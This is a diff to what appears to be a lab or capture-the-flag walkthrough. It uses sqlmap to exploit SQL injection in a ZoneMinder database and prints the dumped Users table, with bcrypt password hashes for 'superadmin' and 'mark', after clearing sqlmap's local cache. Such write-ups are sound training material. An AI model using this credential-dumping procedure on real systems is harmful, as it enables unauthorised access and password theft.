@@ -85,4 +85,23 @@ available databases [3]:
 [*] ending @ 20:11:25 /2026-05-17/
 ```
 
-Great. This allows us to 
+Great. This allows us to determine the next course of action. We know that zm often stores users information in the already existing `Users` table so we can dump that information. Firstly need to `rm` the cached information and rerun sqlmap.
+
+```
+rm -rf /root/.local/share/sqlmap/output/10.129.61.151
+```
+
+We can then create another command and PoC `.sh` file to get the info within the zm database and inside the `Users` table.
+
+```
+Database: zm
+Table: Users
+[2 entries]
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
++------------+--------------------------------------------------------------+
+```
+
